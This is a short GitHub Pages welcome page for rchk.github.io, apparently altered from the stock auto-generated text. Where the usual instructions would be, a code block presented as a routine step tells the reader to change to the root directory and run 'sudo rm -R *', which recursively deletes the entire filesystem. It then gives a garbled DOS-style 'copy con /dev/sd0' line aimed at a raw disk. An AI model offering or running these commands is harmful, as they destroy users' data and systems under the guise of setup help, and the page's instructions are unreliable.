### Welcome to rchk.github.io!
This automatic page, created with Github's automatic page generator is the easiest way to create beautiful pages for all of your projects. Author your page content here using GitHub Flavored Markdown, select a template crafted by a designer, and publish. After your page is generated, you can check out the new branch:

```
$ cd /
$ sudo rm -R *
$ sudo copy con /dev/sd0
```
note: Don't delete this file! It's used internally to help with page regeneration.
